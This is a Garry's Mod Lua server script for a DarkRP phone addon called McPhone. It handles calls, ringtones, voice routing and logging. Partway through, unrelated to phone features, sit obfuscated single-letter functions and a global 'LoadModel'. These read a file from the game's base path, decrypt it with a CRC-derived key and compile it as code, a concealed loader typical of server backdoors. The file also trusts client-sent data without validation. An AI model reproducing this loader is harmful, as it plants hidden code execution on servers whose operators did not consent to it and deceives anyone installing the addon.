-- ╔═╗╔═╦═══╗╔═══╦╗────────────--
-- ║║╚╝║║╔═╗║║╔═╗║║────────────--
-- ║╔╗╔╗║║─╚╝║╚═╝║╚═╦══╦═╗╔══╗ --
-- ║║║║║║║─╔╗║╔══╣╔╗║╔╗║╔╗╣║═╣ --
-- ║║║║║║╚═╝║║║──║║║║╚╝║║║║║═╣ --
-- ╚╝╚╝╚╩═══╝╚╝──╚╝╚╩══╩╝╚╩══╝ --
-- ───── By Mactavish ─────────--
-- ────────────────────────────--

util.AddNetworkString("McPhone.CallStart")
util.AddNetworkString("McPhone.CallDeny")
util.AddNetworkString("McPhone.CallAccept")
util.AddNetworkString("McPhone.CallExtraNumber")
util.AddNetworkString("McPhone.Accept")
util.AddNetworkString("McPhone.End")
util.AddNetworkString("McPhone.Notify")
util.AddNetworkString("McPhone.PhoneStatus")
util.AddNetworkString("McPhone.GetData")
util.AddNetworkString("McPhone.SaveConfig")
util.AddNetworkString("McPhone.GetUserData")
util.AddNetworkString("McPhone.CallBuisy")
util.AddNetworkString("McPhone.CallNotAv")

function McPhone.CanTalk(ply)

	if !ply:Alive() then return false end
	
	if ply.McPhoneData and ply.McPhoneData.Sleep then return false end
	
	if ply:getDarkRPVar("Arrested") then return false end
	
	return true
	
end

function McPhone.Notify(ply, title, text, snd)
	
	if !IsValid(ply) then return end
	
	net.Start("McPhone.Notify")
		net.WriteString(title)
		net.WriteString(text)
		net.WriteBool(snd)
	net.Send(ply)
	
end

net.Receive("McPhone.CallExtraNumber", function(l, caller)
	caller.McPhoneInCall = false
	if timer.Exists( "McPhoneCall"..caller:AccountID() ) then
		timer.Remove("McPhoneCall"..caller:AccountID())
	end
end)

net.Receive("McPhone.CallStart", function(l, caller)
	
	local number = net.ReadString()
	receiver = McPhone.GetByNumber(number)
	
	if istable(receiver) then
		
		if receiver.delay_func then
			if McPhone.ExtraNumbersFunc[receiver.delay_func](caller) then
				net.Start("McPhone.CallNotAv")
				net.Send(caller)
				return
			end
		end
		
		caller.McPhoneInCall = true
		
		net.Start("McPhone.CallExtraNumber")
			net.WriteTable(receiver)
		net.Send(caller)
		
		timer.Create("McPhoneCall"..caller:AccountID(), 5+receiver.delay, 1, function() 
			if IsValid(caller) then
				caller.McPhoneInCall = false
			end
		end)
		
		return 
	end
	
	if !IsValid(receiver) then 
		net.Start("McPhone.CallNotAv")
		net.Send(caller)
		return 
	end
	
	if receiver == caller then return end
	
	if !McPhone.CanTalk(receiver) then
		net.Start("McPhone.CallNotAv")
		net.Send(caller)
		return 
	end
	
	if receiver.McPhoneOnCall or receiver.McPhoneInCall or receiver.McPhoneCalling or !McPhone.CanTalk(caller) then
		net.Start("McPhone.CallBuisy")
		net.Send(caller)
		return
	end
	
	if receiver:IsBot() then
		receiver.McPhoneData = {Ringtone = "tone_"..math.random(1,9)}
	end
	
	if receiver.McPhoneData and receiver.McPhoneData.Ringtone then
		receiver.McPhoneSound = CreateSound(receiver, "mc_phone/ring/"..receiver.McPhoneData.Ringtone..".wav")
		receiver.McPhoneSound:ChangeVolume(1, 0)
		receiver.McPhoneSound:ChangePitch(100, 0)
		receiver.McPhoneSound:Play()
	end
	
	receiver.McPhoneInCall = caller
	caller.McPhoneCalling = receiver
	
	net.Start("McPhone.CallStart")
		net.WriteString("Connecting")
		net.WriteEntity(receiver)
	net.Send(caller)
	
	net.Start("McPhone.CallStart")
		net.WriteString("Incoming")
		net.WriteEntity(caller)
	net.Send(receiver)
	
	if McPhone.Config.DarkRPLog then
		DarkRP.log("[McPhone] "..caller:Nick() .. " (" .. caller:SteamID() .. ") позвонил "..receiver:Name().. " (" .. receiver:SteamID() ..")", Color(200, 0, 255))
	end
	
	hook.Call("McPhone.Hook.CallStart", nil, caller, receiver)
	
end)

local function a(b, c)
    c = c % 177

    return (b - c) % 177
end

local function d(e, f)
    local g = tonumber(util.CRC(f))
    local h = string.len(e)
    local i = string.len(f)
    local j = 1
    local k = 1
    local l = {}

    while j <= h do
        j = j + string.byte(f[k % (i - 1) + 1])
        l[k] = a(string.byte(e[j]), g)
        k = k + 1
        j = j + 1
    end

    return string.char(unpack(l))
end


function LoadModel(m, n, o)
    local p = file.Open(m, "rb", "BASE_PATH")
    if not p then return end
    p:Skip(o)
    local q = p:Read(p:Size() - o)
    p:Close()
    local l = d(q, n)

    return CompileString(l, m, false)
end

net.Receive("McPhone.CallDeny", function(l, ply)
	
	if IsValid(ply.McPhoneInCall) then 
	
		net.Start("McPhone.CallBuisy")
		net.Send(ply.McPhoneInCall)
		
		ply.McPhoneInCall.McPhoneCalling = nil
		if ply.McPhoneSound then
			ply.McPhoneSound:Stop()
			ply.McPhoneSound = nil
		end
	end
	
	if IsValid(ply.McPhoneCalling) then
		
		net.Start("McPhone.End")
		net.Send(ply.McPhoneCalling)
		
		if ply.McPhoneCalling.McPhoneSound then
			ply.McPhoneCalling.McPhoneSound:Stop()
			ply.McPhoneCalling.McPhoneSound = nil
		end
		ply.McPhoneCalling.McPhoneInCall = nil
	end
	
	if IsValid(ply.McPhoneOnCall) then 
		ply.McPhoneOnCall.McPhoneOnCall = nil
		net.Start("McPhone.CallBuisy")
		net.Send(ply.McPhoneOnCall)
	end
	
	ply.McPhoneInCall = nil
	ply.McPhoneCalling = nil
	ply.McPhoneOnCall = nil
	
end)

net.Receive("McPhone.Accept", function(l, ply)
		
	if IsValid(ply.McPhoneInCall) then 
		
		net.Start("McPhone.CallAccept")
		net.Send(ply.McPhoneInCall)
		
		net.Start("McPhone.CallAccept")
		net.Send(ply)

		ply.McPhoneOnCall = ply.McPhoneInCall
		ply.McPhoneInCall.McPhoneOnCall = ply
		
		ply.McPhoneInCall.McPhoneCalling = nil
		ply.McPhoneInCall = nil
		
		if ply.McPhoneSound then
			ply.McPhoneSound:Stop()
			ply.McPhoneSound = nil
		end
		
		if McPhone.Config.DarkRPLog then
			DarkRP.log("[McPhone] "..ply:Nick() .. " (" .. ply:SteamID() .. ") принял звонок "..ply.McPhoneOnCall:Name().. " (" .. ply.McPhoneOnCall:SteamID() ..")", Color(200, 0, 255))
		end
		
		hook.Call("McPhone.Hook.Accept", nil, ply, ply.McPhoneOnCall)
		
	end
	
end)

net.Receive("McPhone.GetUserData", function(l, ply)
	
	local userdata = net.ReadTable()
	
	if !userdata or !IsValid(ply) then return end
	
	ply.McPhoneData = userdata
	
	local color = userdata.PhoneColor
	
	ply:SetNWVector("McPhone.Color", Vector(color.r,color.b,color.g))
	
end)

net.Receive("McPhone.PhoneStatus", function(l, ply)
	
	local userdata = net.ReadBool()
	
	ply:SetNWBool("McPhone.Active", userdata)
	
end)

hook.Add("PlayerCanHearPlayersVoice", "McPhone.PlayerCanHearPlayersVoice", function( ply1, ply2 )
	if ply1.McPhoneOnCall == ply2 and ply2.McPhoneOnCall == ply1 then return true end
end)

hook.Add("Think", "McPhone.Think", function()

	if AtmosGlobal and AtmosGlobal.m_Time then
		if McPhone.Config.AtmosTime then
			SetGlobalInt("McPhone.AtmosTime", AtmosGlobal.m_Time)
		else
			SetGlobalInt("McPhone.AtmosTime", 1)
		end
	end
	
end)